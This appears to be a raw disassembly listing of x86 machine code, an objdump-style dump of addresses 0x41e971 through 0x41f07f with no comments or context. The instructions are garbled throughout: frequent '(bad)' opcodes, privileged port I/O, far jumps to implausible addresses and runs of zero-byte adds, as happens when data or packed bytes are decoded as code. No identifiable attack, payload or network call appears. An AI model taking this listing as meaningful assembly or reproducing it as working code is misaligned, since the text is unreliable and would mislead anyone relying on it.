  41e971:	rol    DWORD PTR [edx],cl
  41e973:	lea    ecx,[ebx+ecx*8-0x2b]
  41e977:	das    
  41e978:	nop
  41e979:	mov    dl,0x62
  41e97b:	xchg   DWORD PTR [ebx],esi
  41e97d:	(bad)  
  41e97e:	in     al,dx
  41e97f:	mov    edi,es
  41e981:	xor    DWORD PTR [eax-0x2],0x890f4db9
  41e988:	fwait
  41e989:	mov    cl,0xf7
  41e98b:	xchg   edi,ebx
  41e98d:	sbb    esi,ebx
  41e98f:	add    dl,BYTE PTR [eax-0x10798d4e]
  41e995:	aad    0xdc
  41e997:	mov    WORD PTR [edx-0x6ffc4259],es
  41e99d:	jb     0x41e9bd
  41e99f:	pop    ss
  41e9a0:	jmp    DWORD PTR [eax+0x7108a90e]
  41e9a6:	aam    0xe9
  41e9a8:	xchg   ebx,eax
  41e9a9:	jb     0x41ea02
  41e9ab:	sbb    al,0xb
  41e9ad:	int3   
  41e9ae:	inc    esi
  41e9af:	icebp  
  41e9b0:	xchg   edx,eax
  41e9b1:	mov    dl,0x78
  41e9b3:	std    
  41e9b4:	sub    esp,DWORD PTR [ebp+0x16]
  41e9b7:	call   0x72816c4f
  41e9bc:	mov    ebp,0x79917449
  41e9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c2:	psubsw mm2,QWORD PTR [edi]
  41e9c5:	adc    al,0x63
  41e9c7:	xchg   ebx,eax
  41e9c8:	es push 0x1c251c2
  41e9ce:	psubsw mm0,QWORD PTR [eax]
  41e9d1:	add    BYTE PTR [eax],al
  41e9d3:	add    BYTE PTR [eax],al
  41e9d5:	ins    DWORD PTR es:[edi],dx
  41e9d6:	xor    DWORD PTR [ebp+edi*1-0x6d],ebp
  41e9da:	pop    esi
  41e9db:	add    BYTE PTR [esi+ecx*8-0x2],bl
  41e9df:	ds cwde 
  41e9e1:	clc    
  41e9e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9e3:	js     0x41e9ab
  41e9e5:	sbb    edx,DWORD PTR [ecx]
  41e9e7:	sbb    ebp,eax
  41e9e9:	xchg   ebx,eax
  41e9ea:	cs iret 
  41e9ec:	mov    ch,0xda
  41e9ee:	add    edx,DWORD PTR [eax]
  41e9f0:	(bad)  
  41e9f1:	sbb    dh,dl
  41e9f3:	inc    ebx
  41e9f4:	jb     0x41e9ed
  41e9f6:	push   ebx
  41e9f7:	cli    
  41e9f8:	or     DWORD PTR [ebx+0x7cb70eb2],edx
  41e9fe:	sub    eax,ebp
  41ea00:	push   es
  41ea01:	inc    esi
  41ea02:	iret   
  41ea03:	add    BYTE PTR [ecx+0x64df2993],ch
  41ea09:	(bad)  
  41ea0a:	fidivr DWORD PTR [esi]
  41ea0c:	es into 
  41ea0e:	ficom  DWORD PTR [esi]
  41ea10:	jmp    0xf52f9ca8
  41ea15:	jecxz  0x41e9d5
  41ea17:	dec    esi
  41ea18:	jmp    0xe5a5fd2d
  41ea1d:	fsubp  st(3),st
  41ea1f:	stc    
  41ea20:	add    ah,ch
  41ea22:	push   ebx
  41ea23:	fld    TBYTE PTR [ebx]
  41ea25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea26:	sub    bl,BYTE PTR [ecx-0x6a61f2bb]
  41ea2c:	dec    ebp
  41ea2d:	xor    eax,0xe8e450f0
  41ea32:	push   ebp
  41ea33:	pusha  
  41ea34:	in     eax,0x60
  41ea36:	cdq    
  41ea37:	cmc    
  41ea38:	inc    DWORD PTR [eax]
  41ea3a:	add    BYTE PTR [eax],al
  41ea3c:	add    BYTE PTR [eax],al
  41ea3e:	int3   
  41ea3f:	(bad)  
  41ea41:	aas    
  41ea42:	mov    ecx,0x21d45859
  41ea47:	sar    DWORD PTR [ebx],0xff
  41ea4a:	ss push ebp
  41ea4c:	push   eax
  41ea4d:	in     eax,dx
  41ea4e:	xor    al,0x31
  41ea50:	push   cs
  41ea51:	push   DWORD PTR [esi]
  41ea53:	daa    
  41ea54:	pop    esi
  41ea55:	call   FWORD PTR [esi+edx*8+0x53a93ffe]
  41ea5c:	nop
  41ea5d:	and    dh,ah
  41ea5f:	cmp    eax,0xf2b96beb
  41ea64:	ja     0x41ea77
  41ea66:	add    BYTE PTR [ebp+edi*8-0x73],dh
  41ea6a:	sub    al,0x32
  41ea6c:	pop    esi
  41ea6d:	push   ecx
  41ea6e:	repnz int 0x77
  41ea71:	imul   edx,ecx,0x58
  41ea74:	push   ss
  41ea75:	add    DWORD PTR [ecx-0x63],ebp
  41ea78:	dec    esp
  41ea79:	leave  
  41ea7a:	stos   BYTE PTR es:[edi],al
  41ea7b:	adc    DWORD PTR [edi+0x1e2abaec],0x53
  41ea82:	inc    DWORD PTR [eax+edi*2+0x7827c221]
  41ea89:	add    BYTE PTR [edi],bl
  41ea8b:	cmp    eax,0x764f6001
  41ea90:	push   cs
  41ea91:	sub    DWORD PTR [ebp-0x36],0x1e
  41ea95:	fcmovnb st,st(3)
  41ea97:	jmp    0x41eade
  41ea99:	inc    ebx
  41ea9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea9b:	mov    bl,dh
  41ea9d:	mov    BYTE PTR [eax+0x872fc9],dl
  41eaa3:	add    BYTE PTR [eax],al
  41eaa5:	add    BYTE PTR [eax],al
  41eaa7:	dec    esi
  41eaa8:	fimul  DWORD PTR [ecx+0x11dbe1b0]
  41eaae:	or     dx,WORD PTR [edi-0x5de69a7e]
  41eab5:	pcmpgtd mm3,QWORD PTR [ebx]
  41eab8:	xchg   edi,eax
  41eab9:	test   BYTE PTR [edx-0x78cfe8b3],cl
  41eabf:	dec    esi
  41eac0:	fmul   DWORD PTR [ecx+0x11dbe8ab]
  41eac6:	mov    ebp,0x1240c7
  41eacb:	adc    eax,0xb161e1c
  41ead0:	lahf   
  41ead1:	xchg   esi,eax
  41ead2:	or     al,0xe7
  41ead4:	sub    bl,ch
  41ead6:	int3   
  41ead7:	xchg   edi,eax
  41ead8:	cwde   
  41ead9:	mov    eax,ds:0x6b01c888
  41eade:	push   ebp
  41eadf:	mov    DWORD PTR [ebx-0x45],esp
  41eae2:	rcl    DWORD PTR [eax-0x7bb59925],0x73
  41eae9:	mov    ah,dl
  41eaeb:	nop
  41eaec:	fisttp DWORD PTR [esi+0x6ce9fcbf]
  41eaf2:	dec    edx
  41eaf3:	ins    BYTE PTR es:[edi],dx
  41eaf4:	fadd   DWORD PTR [eax-0x32]
  41eaf7:	stos   DWORD PTR es:[edi],eax
  41eaf8:	mov    al,0xe8
  41eafa:	inc    esp
  41eafb:	inc    edi
  41eafc:	inc    esp
  41eafd:	test   eax,0xed090965
  41eb02:	out    0x8,eax
  41eb04:	popf   
  41eb05:	adc    DWORD PTR [eax],eax
  41eb07:	adc    eax,0xe7962e
  41eb0c:	add    BYTE PTR [eax],al
  41eb0e:	add    BYTE PTR [eax],al
  41eb10:	jl     0x41eac2
  41eb12:	adc    DWORD PTR [eax],eax
  41eb14:	or     eax,0x1b161d9b
  41eb19:	push   ss
  41eb1a:	xchg   esi,eax
  41eb1b:	or     al,0xdf
  41eb1d:	test   eax,0xb28fccdc
  41eb22:	cmp    al,0xb1
  41eb24:	or     dl,bh
  41eb26:	push   ebp
  41eb27:	jnp    0x41eb8e
  41eb29:	mov    edi,0xb1d172cf
  41eb2e:	div    DWORD PTR [esi+0x62]
  41eb31:	into   
  41eb32:	mov    gs,WORD PTR [edi+esi*8-0x30]
  41eb36:	neg    DWORD PTR [ebx+0x3f80143]
  41eb3c:	adc    esi,edx
  41eb3e:	and    esi,ebx
  41eb40:	adc    BYTE PTR [edi-0x4d],cl
  41eb43:	aam    0x61
  41eb45:	mov    dh,0x15
  41eb47:	sti    
  41eb48:	ins    DWORD PTR es:[edi],dx
  41eb49:	mov    ch,0x70
  41eb4b:	mov    esp,0x4b945af
  41eb50:	nop
  41eb51:	jno    0x41eb88
  41eb53:	sub    eax,0x9876f4cf
  41eb58:	dec    ebx
  41eb59:	mov    ah,0xf7
  41eb5b:	add    eax,DWORD PTR [ecx+0x67]
  41eb5e:	add    eax,0xf6b5db31
  41eb63:	add    edx,DWORD PTR [eax-0x4bbf8599]
  41eb69:	push   esi
  41eb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb6b:	aam    0x68
  41eb6d:	outs   dx,BYTE PTR fs:[esi]
  41eb6f:	cmp    BYTE PTR [edx+edi*2+0xef54],dh
  41eb76:	add    BYTE PTR [eax],al
  41eb78:	add    BYTE PTR [ebx+0x1903b7a1],bh
  41eb7e:	mov    ss,edi
  41eb80:	icebp  
  41eb81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb82:	mov    dl,0x6e
  41eb84:	inc    eax
  41eb85:	mov    ah,0xa6
  41eb87:	jp     0x41eb4d
  41eb89:	jecxz  0x41eb31
  41eb8b:	jp     0x41ebc5
  41eb8d:	je     0x41eb11
  41eb8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb90:	jl     0x41ebe9
  41eb92:	ds mov edi,ds
  41eb95:	mov    bl,0xda
  41eb97:	arpl   WORD PTR [ebx-0x3b8c2fcb],dx
  41eb9d:	mov    ds:0x1f830ebd,al
  41eba2:	cmp    eax,0x634fc553
  41eba7:	ds out 0xe0,al
  41ebaa:	xor    dl,bl
  41ebac:	in     eax,dx
  41ebad:	sbb    BYTE PTR [ebp-0x4dac07ca],ah
  41ebb3:	cdq    
  41ebb4:	fld    st(1)
  41ebb6:	int    0x3
  41ebb8:	cmp    esi,edi
  41ebba:	(bad)  
  41ebbb:	push   cs
  41ebbc:	adc    DWORD PTR [edi+ecx*8+0x7b5ee9ed],0x32
  41ebc4:	ror    esp,1
  41ebc6:	icebp  
  41ebc7:	aas    
  41ebc8:	neg    BYTE PTR [edi+0x2baf99e2]
  41ebce:	data16 fist WORD PTR [edi+0x14cf3418]
  41ebd5:	(bad)  
  41ebd6:	pop    ecx
  41ebd7:	sbb    dh,BYTE PTR [edi+esi*2-0x6a]
  41ebdb:	or     bl,BYTE PTR [edx]
  41ebdd:	add    BYTE PTR [eax],al
  41ebdf:	add    BYTE PTR [eax],al
  41ebe1:	add    BYTE PTR [ebp+ecx*8-0x3b],ah
  41ebe5:	push   0xffffffe7
  41ebe7:	mov    ebx,0xa3b0259b
  41ebec:	ds je  0x41ec46
  41ebef:	xchg   esi,eax
  41ebf0:	jb     0x41ebab
  41ebf2:	lods   eax,DWORD PTR ds:[esi]
  41ebf3:	mov    ah,0x97
  41ebf5:	lds    esp,FWORD PTR [edi-0x51]
  41ebf8:	in     eax,dx
  41ebf9:	hlt    
  41ebfa:	daa    
  41ebfb:	mov    ds:0xff7e94e,al
  41ec00:	arpl   di,dx
  41ec02:	in     al,dx
  41ec03:	arpl   WORD PTR [edx],si
  41ec05:	fstp   st(6)
  41ec07:	jae    0x41ec3b
  41ec09:	add    eax,0xcd5b3ba4
  41ec0e:	ja     0x41ebea
  41ec10:	pop    es
  41ec11:	sbb    BYTE PTR [ecx],bl
  41ec13:	into   
  41ec14:	xchg   edx,eax
  41ec15:	sub    DWORD PTR [esi-0x39228745],edx
  41ec1b:	jae    0x41ec4f
  41ec1d:	add    BYTE PTR [ecx-0x7a],ah
  41ec20:	inc    DWORD PTR ds:[esi-0x53f32dca]
  41ec27:	(bad)  
  41ec28:	xor    bl,BYTE PTR [eax-0x7]
  41ec2b:	inc    edi
  41ec2c:	push   ecx
  41ec2d:	and    al,0x55
  41ec2f:	xchg   BYTE PTR [ecx+0x3e869544],bl
  41ec35:	lea    esi,[ebp+0x535059d2]
  41ec3b:	aaa    
  41ec3c:	jmp    0x41ec53
  41ec3e:	xchg   ecx,eax
  41ec3f:	lds    ebp,FWORD PTR ds:0x60f67400
  41ec45:	add    al,0x0
  41ec47:	add    BYTE PTR [eax],al
  41ec49:	add    BYTE PTR [eax],al
  41ec4b:	jb     0x41ec70
  41ec4d:	mul    DWORD PTR [edx]
  41ec4f:	jb     0x41ebdb
  41ec51:	xor    al,BYTE PTR [eax+0x62]
  41ec54:	jb     0x41ec88
  41ec56:	inc    esp
  41ec57:	mov    dh,BYTE PTR ds:0xf53900ad
  41ec5d:	aaa    
  41ec5e:	push   0x856029
  41ec63:	aam    0xd5
  41ec65:	pop    ebx
  41ec66:	bound  ebp,QWORD PTR [edi]
  41ec68:	xchg   BYTE PTR [ebp-0x18],bl
  41ec6b:	dec    ebp
  41ec6c:	test   DWORD PTR [eax],edx
  41ec6e:	add    BYTE PTR [edx],dh
  41ec70:	es xchg edi,eax
  41ec72:	push   esp
  41ec73:	test   esi,edx
  41ec75:	xchg   esi,eax
  41ec76:	ins    BYTE PTR es:[edi],dx
  41ec77:	xchg   ebp,eax
  41ec78:	dec    BYTE PTR [esi]
  41ec7a:	push   esp
  41ec7b:	xchg   ebp,eax
  41ec7c:	jmp    0xff8:0xb17bc58e
  41ec83:	in     eax,0x4a
  41ec85:	in     eax,dx
  41ec86:	(bad)  
  41ec87:	jns    0x41ecd2
  41ec89:	fsubr  st,st(0)
  41ec8b:	cmp    al,0xf7
  41ec8d:	in     eax,dx
  41ec8e:	push   edx
  41ec90:	push   ds
  41ec91:	xchg   ecx,eax
  41ec92:	fcomi  st,st(5)
  41ec94:	mov    ah,0xd4
  41ec96:	add    edi,DWORD PTR [eax]
  41ec98:	dec    ecx
  41ec99:	sbb    al,al
  41ec9b:	nop
  41ec9c:	sub    ebp,DWORD PTR [esi]
  41ec9e:	add    BYTE PTR [ecx],cl
  41eca0:	adc    DWORD PTR [ebx],edx
  41eca2:	mov    al,BYTE PTR [ebp-0x6fbbfd89]
  41eca8:	pop    esi
  41eca9:	sbb    DWORD PTR [edx],edx
  41ecab:	sbb    BYTE PTR [ecx],dl
  41ecad:	paddw  mm0,QWORD PTR [eax]
  41ecb0:	add    BYTE PTR [eax],al
  41ecb2:	add    BYTE PTR [eax],al
  41ecb4:	test   DWORD PTR [ebx],edx
  41ecb6:	jecxz  0x41ecf7
  41ecb8:	nop
  41ecb9:	jge    0x41ed26
  41ecbb:	inc    eax
  41ecbc:	xchg   esi,eax
  41ecbd:	inc    edx
  41ecbe:	add    BYTE PTR [eax],cl
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	push   eax
  41ecc2:	sub    eax,0xbe50b824
  41ecc7:	pop    ebx
  41ecc8:	sahf   
  41ecc9:	fwait
  41ecca:	adc    ah,BYTE PTR [esi+0x19]
  41eccd:	cdq    
  41ecce:	out    0x65,al
  41ecd0:	sbb    esp,DWORD PTR [eax+0x52761fee]
  41ecd6:	push   eax
  41ecd7:	push   cs
  41ecd8:	outs   dx,BYTE PTR ds:[esi]
  41ecd9:	inc    eax
  41ecda:	sub    eax,0x6bb57c24
  41ecdf:	inc    eax
  41ece0:	mov    al,ds:0x8c405cd4
  41ece5:	mov    edx,DWORD PTR [ebp+0x3d0f6c73]
  41eceb:	std    
  41ecec:	(bad)  
  41eced:	fcomp  QWORD PTR [eax+eax*2-0x6c]
  41ecf1:	fcomp  DWORD PTR [ecx-0x1b6718f4]
  41ecf7:	or     ah,0xc7
  41ecfa:	and    ebp,edi
  41ecfc:	add    al,0xb8
  41ecfe:	not    BYTE PTR [edi+eax*4-0x73]
  41ed02:	in     al,0xb4
  41ed04:	ror    ebx,cl
  41ed06:	nop
  41ed07:	ret    
  41ed08:	test   BYTE PTR [ebx],ch
  41ed0a:	in     eax,0xb4
  41ed0c:	rcr    ebp,cl
  41ed0e:	xchg   esp,eax
  41ed0f:	jae    0x41ecbd
  41ed11:	mov    bl,0x11
  41ed13:	(bad)
  41ed16:	mov    ebx,0x80
  41ed1b:	add    BYTE PTR [eax],al
  41ed1d:	dec    esp
  41ed1e:	mov    dl,0xe3
  41ed20:	js     0x41ecfd
  41ed22:	xchg   esi,eax
  41ed23:	(bad)  
  41ed24:	fwait
  41ed25:	dec    ebx
  41ed26:	fld    QWORD PTR ds:0xd37e0a86
  41ed2c:	jmp    0x41ed5d
  41ed2e:	rol    DWORD PTR [eax*4-0x2043c0d4],0x73
  41ed36:	ficom  DWORD PTR [ecx]
  41ed38:	xchg   esi,eax
  41ed39:	sbb    eax,0x6c3f70cd
  41ed3e:	mov    ss,WORD PTR [esi+eiz*1+0x17]
  41ed42:	call   0xc076:0x68d0792a
  41ed49:	pop    ebx
  41ed4a:	mov    al,0xf7
  41ed4c:	add    edx,ecx
  41ed4e:	or     ax,0xfe79
  41ed52:	repz cmc 
  41ed54:	add    bh,al
  41ed56:	imul   edx,DWORD PTR [eax],0x3639dc85
  41ed5c:	add    ebx,esi
  41ed5e:	mov    dh,0xf
  41ed60:	adc    DWORD PTR [ebx-0x4e],0x303f46f6
  41ed67:	cmp    al,0x4
  41ed69:	inc    ebx
  41ed6a:	pushf  
  41ed6b:	and    al,BYTE PTR [ebp+0x43c9c2a2]
  41ed71:	nop
  41ed72:	(bad)  
  41ed73:	bnd jmp 0x41ed86
  41ed76:	jbe    0x41ed6f
  41ed78:	add    ah,BYTE PTR [ebx]
  41ed7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed7b:	(bad)
  41ed7f:	je     0x41ed01
  41ed81:	add    BYTE PTR [eax],al
  41ed83:	add    BYTE PTR [eax],al
  41ed85:	add    BYTE PTR [edi+0x47],cl
  41ed88:	std    
  41ed89:	xor    BYTE PTR [edx-0x6fbf8752],0xb2
  41ed90:	ja     0x41ed89
  41ed92:	lahf   
  41ed93:	das    
  41ed94:	mov    esp,0x2c676f03
  41ed99:	out    dx,eax
  41ed9a:	outs   dx,DWORD PTR ds:[esi]
  41ed9b:	mov    eax,ds:0x5493a90e
  41eda0:	scas   eax,DWORD PTR es:[edi]
  41eda1:	mov    bl,0x80
  41eda3:	jbe    0x41edb3
  41eda5:	(bad)
  41eda9:	adc    DWORD PTR [esi-0x67],edi
  41edac:	in     eax,dx
  41edad:	push   ss
  41edae:	mov    esp,0x37171275
  41edb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb4:	xchg   ecx,eax
  41edb5:	lods   eax,DWORD PTR ds:[esi]
  41edb6:	xchg   ebx,eax
  41edb7:	retf   
  41edb8:	(bad)  
  41edb9:	iret   
  41edba:	jbe    0x41ed89
  41edbc:	add    edi,ecx
  41edbe:	and    DWORD PTR [esi+ecx*1-0x6e5be909],ecx
  41edc5:	sub    eax,0xf662cb94
  41edca:	sub    eax,DWORD PTR [ebx+0x37]
  41edcd:	(bad)  
  41edce:	adc    al,0x30
  41edd0:	iret   
  41edd1:	push   ebp
  41edd2:	(bad)  
  41edd3:	xor    dh,BYTE PTR [eiz*8-0x16f18ff0]
  41edda:	adc    edi,DWORD PTR [ecx-0x4d6095fa]
  41ede0:	unpcklps xmm1,XMMWORD PTR ds:0x53fbf6a1
  41ede7:	mov    dl,0x74
  41ede9:	dec    eax
  41edea:	add    BYTE PTR [eax],al
  41edec:	add    BYTE PTR [eax],al
  41edee:	add    BYTE PTR [ebp-0x6216adbf],cl
  41edf4:	xor    edx,DWORD PTR [ebp-0x1c]
  41edf7:	sbb    esi,DWORD PTR [ebp+0x39]
  41edfa:	xchg   BYTE PTR [esi*1-0x5ef319ab],dl
  41ee01:	push   ds
  41ee02:	fcom   DWORD PTR [ebx-0x4e]
  41ee05:	je     0x41ee67
  41ee07:	push   ebp
  41ee08:	mov    ecx,0x6050c44c
  41ee0d:	cdq    
  41ee0e:	dec    ebp
  41ee0f:	adc    bh,cl
  41ee11:	out    0x68,al
  41ee13:	daa    
  41ee14:	and    edx,DWORD PTR [ecx]
  41ee16:	jmp    0x854fae
  41ee1b:	setle  BYTE PTR [ebp-0x151172b4]
  41ee22:	adc    eax,0x2dc05d
  41ee27:	lock mov esi,DWORD PTR [edx]
  41ee2a:	cmp    al,0xbc
  41ee2c:	out    dx,eax
  41ee2d:	pusha  
  41ee2e:	pop    es
  41ee2f:	push   0xffffffef
  41ee31:	hlt    
  41ee32:	add    al,0x2b
  41ee34:	scas   eax,DWORD PTR es:[edi]
  41ee35:	push   cs
  41ee36:	push   0x2b
  41ee38:	xchg   esi,eax
  41ee39:	jbe    0x41ee15
  41ee3b:	cmp    BYTE PTR [edi+0x36216a0e],ch
  41ee41:	and    DWORD PTR [eax],ebp
  41ee43:	stos   BYTE PTR es:[edi],al
  41ee44:	mov    ecx,DWORD PTR [esi]
  41ee46:	mov    DWORD PTR [ebp+0xcff31eb],esp
  41ee4c:	(bad)  
  41ee4d:	(bad)  
  41ee4e:	aas    
  41ee4f:	stc    
  41ee50:	cmp    edi,esi
  41ee52:	test   DWORD PTR [eax],eax
  41ee54:	add    BYTE PTR [eax],al
  41ee56:	add    BYTE PTR [eax],al
  41ee58:	(bad)  
  41ee5a:	les    esi,FWORD PTR [ebx]
  41ee5c:	xor    BYTE PTR [ecx],ah
  41ee5e:	xchg   edx,eax
  41ee5f:	and    al,0x71
  41ee61:	mov    dh,0xe
  41ee63:	add    BYTE PTR [ecx-0x7297a31b],cl
  41ee69:	(bad)  
  41ee6a:	in     eax,dx
  41ee6b:	(bad)  
  41ee6c:	js     0x41eee6
  41ee6e:	adc    eax,DWORD PTR [ecx]
  41ee70:	inc    eax
  41ee71:	loop   0x41eea4
  41ee73:	xor    BYTE PTR [esi],ah
  41ee75:	test   eax,0xb6691372
  41ee7a:	xchg   ecx,eax
  41ee7b:	rcr    BYTE PTR [esp+eiz*4+0x26dd8499],0xee
  41ee83:	(bad)  
  41ee84:	mov    ecx,0x3d15eade
  41ee89:	mov    ds:0xfa30004e,eax
  41ee8e:	xor    DWORD PTR [ecx+eiz*2],ebx
  41ee91:	add    bl,BYTE PTR [eax+0x52237940]
  41ee97:	and    al,0x90
  41ee99:	mov    ecx,0x939dfcc2
  41ee9e:	add    al,0x40
  41eea0:	nop
  41eea1:	ds (bad) 
  41eea3:	and    eax,eax
  41eea5:	xor    bl,BYTE PTR [esi-0x1]
  41eea8:	pop    edi
  41eea9:	fdivr  QWORD PTR [ecx-0x1c]
  41eeac:	push   0xffffffdc
  41eeae:	adc    DWORD PTR [ecx+0x29f7b4],eax
  41eeb4:	sub    BYTE PTR [eax+0xb74437f],0x58
  41eebb:	inc    ebx
  41eebc:	add    BYTE PTR [eax],al
  41eebe:	add    BYTE PTR [eax],al
  41eec0:	add    BYTE PTR [edi+eax*1+0x13],ch
  41eec4:	(bad)
  41eec7:	and    DWORD PTR [ecx],esp
  41eec9:	nop
  41eeca:	fist   DWORD PTR [ecx]
  41eecc:	xchg   esp,edx
  41eece:	mul    DWORD PTR ds:0x8ef9488
  41eed4:	xor    ebp,edi
  41eed6:	lods   al,BYTE PTR ds:[esi]
  41eed7:	push   edx
  41eed8:	aas    
  41eed9:	sbb    edx,DWORD PTR [edi]
  41eedb:	inc    ebp
  41eedc:	fist   WORD PTR ds:0x873c3698
  41eee2:	dec    edi
  41eee3:	dec    esi
  41eee4:	(bad)  
  41eee5:	out    dx,eax
  41eee6:	fist   DWORD PTR [ebx+eax*2+0xd03d3ac]
  41eeed:	sbb    DWORD PTR es:0x1391d6fe,edx
  41eef4:	adc    bx,WORD PTR [ebx+edx*8]
  41eef8:	xchg   DWORD PTR [edi+0x74439bb1],eax
  41eefe:	sti    
  41eeff:	jle    0x41ef44
  41ef01:	ins    BYTE PTR es:[edi],dx
  41ef02:	sti    
  41ef03:	rol    ebp,0x54
  41ef06:	test   DWORD PTR [ebx],0x3ddea700
  41ef0c:	movmskps ebx,xmm3
  41ef0f:	fld    DWORD PTR [edi+0x1c]
  41ef12:	cmc    
  41ef13:	fnstenv [ebx-0x52]
  41ef16:	mov    dl,0x9f
  41ef18:	mul    DWORD PTR [ebx-0x37f23c86]
  41ef1e:	aas    
  41ef1f:	sbb    BYTE PTR [edx-0x2d],cl
  41ef22:	mov    fs,ebp
  41ef24:	or     BYTE PTR [eax],al
  41ef26:	add    BYTE PTR [eax],al
  41ef28:	add    BYTE PTR [eax],al
  41ef2a:	jns    0x41eed1
  41ef2c:	cmp    eax,0xf3a0b3c7
  41ef31:	outs   dx,BYTE PTR ds:[esi]
  41ef32:	xor    al,0xbb
  41ef35:	daa    
  41ef36:	jle    0x41eeed
  41ef38:	push   eax
  41ef39:	adc    DWORD PTR [esi+0x6e],edx
  41ef3c:	fistp  DWORD PTR [ecx]
  41ef3e:	xchg   edx,eax
  41ef3f:	add    dh,bh
  41ef41:	outs   dx,BYTE PTR ds:[esi]
  41ef42:	xchg   esp,eax
  41ef43:	lock mov ebx,0xc9b39e27
  41ef49:	inc    ebx
  41ef4a:	popa   
  41ef4b:	in     eax,dx
  41ef4c:	jnp    0x41ef91
  41ef4e:	xchg   esp,eax
  41ef4f:	cs sub eax,0x8fb29003
  41ef55:	or     BYTE PTR [edi],dl
  41ef57:	leave  
  41ef58:	not    DWORD PTR [eax+0x4938e13]
  41ef5e:	nop
  41ef5f:	mov    dl,0x27
  41ef61:	out    dx,al
  41ef62:	call   FWORD PTR [edx-0x9]
  41ef65:	in     eax,dx
  41ef66:	neg    DWORD PTR [edx-0x9]
  41ef69:	in     eax,dx
  41ef6a:	out    dx,eax
  41ef6b:	xor    eax,0x62a4283c
  41ef70:	lods   al,BYTE PTR ds:[esi]
  41ef71:	pop    ss
  41ef72:	inc    eax
  41ef73:	mov    ds:0xf2130437,eax
  41ef78:	and    esp,esi
  41ef7a:	xor    dl,0x1d
  41ef7d:	mov    edx,DWORD PTR [ebx]
  41ef7f:	mov    ss,WORD PTR [edi+0x6]
  41ef82:	nop
  41ef83:	mov    dl,0x72
  41ef85:	mov    BYTE PTR [ebx+0x2a],dh
  41ef88:	clc    
  41ef89:	add    edx,DWORD PTR [eax+0x179462]
  41ef8f:	add    BYTE PTR [eax],al
  41ef91:	add    BYTE PTR [eax],al
  41ef93:	inc    esp
  41ef94:	sahf   
  41ef95:	aaa    
  41ef96:	add    al,0x11
  41ef98:	dec    esi
  41ef99:	push   cs
  41ef9a:	int    0x5b
  41ef9c:	mov    dl,0x20
  41ef9e:	outs   dx,BYTE PTR ds:[esi]
  41ef9f:	pop    ds
  41efa0:	jl     0x41efd4
  41efa2:	adc    eax,0x5ee5faf4
  41efa7:	adc    DWORD PTR ds:0x62bdddcf,esi
  41efad:	fwait
  41efae:	gs mov eax,0x93e90f26
  41efb4:	(bad)  
  41efb5:	in     eax,dx
  41efb6:	aam    0x53
  41efb8:	mov    ecx,0x80ee94e
  41efbd:	rcl    BYTE PTR fs:[edi],cl
  41efc0:	(bad)  
  41efc1:	(bad)  
  41efc2:	cld    
  41efc3:	adc    eax,edi
  41efc5:	setne  BYTE PTR [edi-0x723a29c4]
  41efcc:	xchg   BYTE PTR [ecx],dl
  41efce:	xchg   esi,eax
  41efcf:	popf   
  41efd0:	add    edi,edi
  41efd2:	adc    DWORD PTR [edx-0x69ede0ff],ebx
  41efd8:	add    DWORD PTR [edi],ebp
  41efda:	test   eax,0x9063cfda
  41efe0:	mov    es,WORD PTR ds:0x4e93cf74
  41efe6:	cmp    DWORD PTR [edi],ecx
  41efe8:	je     0x41f01c
  41efea:	and    eax,0x5c0e59dc
  41efef:	xlat   BYTE PTR ds:[ebx]
  41eff0:	xchg   ebx,eax
  41eff1:	cmp    bl,BYTE PTR [ecx]
  41eff3:	adc    DWORD PTR [ebp+0xd85a],esp
  41eff9:	add    BYTE PTR [eax],al
  41effb:	add    bl,dl
  41effd:	(bad)  
  41effe:	xchg   edx,eax
  41efff:	test   eax,0x2599abdf
  41f004:	js     0x41f080
  41f006:	xchg   edi,eax
  41f007:	mov    ?,WORD PTR cs:[ecx]
  41f00a:	push   ebx
  41f00b:	(bad)
  41f00e:	push   esi
  41f00f:	out    dx,eax
  41f010:	add    al,0x74
  41f012:	xor    ch,BYTE PTR [ecx]
  41f014:	sbb    ebp,DWORD PTR [edi+0x18]
  41f017:	add    BYTE PTR [edx],ah
  41f019:	out    dx,eax
  41f01a:	xor    DWORD PTR [eax+eiz*1-0x6],eax
  41f01e:	sbb    ecx,DWORD PTR [edx]
  41f020:	jge    0x41efbc
  41f022:	add    al,0x88
  41f024:	sahf   
  41f025:	mov    bl,0x25
  41f027:	ins    BYTE PTR es:[edi],dx
  41f028:	xchg   ebp,eax
  41f029:	xchg   edx,eax
  41f02a:	popa   
  41f02b:	push   es
  41f02c:	jmp    0x3eca5da7
  41f031:	mov    ah,0x97
  41f033:	jl     0x41efca
  41f035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f036:	in     al,dx
  41f037:	(bad)  
  41f038:	xor    al,0x3b
  41f03a:	push   0x24
  41f03c:	inc    esi
  41f03d:	xor    ebp,ebx
  41f03f:	sbb    ch,BYTE PTR [esi+0x2d]
  41f042:	mov    al,0xfe
  41f044:	jle    0x41f078
  41f046:	xchg   edi,eax
  41f047:	inc    esp
  41f048:	push   ebp
  41f049:	fwait
  41f04a:	cdq    
  41f04b:	dec    esp
  41f04c:	push   ebp
  41f04d:	xchg   edi,eax
  41f04e:	xchg   ebp,eax
  41f04f:	cmp    BYTE PTR [ecx-0x6100333a],dl
  41f055:	ss aam 0x5f
  41f058:	out    dx,eax
  41f059:	out    0x46,eax
  41f05b:	mov    edx,DWORD PTR [eax+ebp*8+0x55ce]
  41f062:	add    BYTE PTR [eax],al
  41f064:	add    BYTE PTR [edx+0x1e48e57],dh
  41f06a:	xor    edi,edx
  41f06c:	inc    eax
  41f06d:	retf   0x43e9
  41f070:	push   edi
  41f071:	and    dl,0x31
  41f074:	sbb    BYTE PTR [ebx-0x12],dl
  41f077:	cwde   
  41f078:	dec    esp
  41f079:	xchg   ebp,eax
  41f07a:	xchg   esi,eax
  41f07b:	idiv   ah
  41f07d:	jbe    0x41f02d
  41f07f:	push   cs
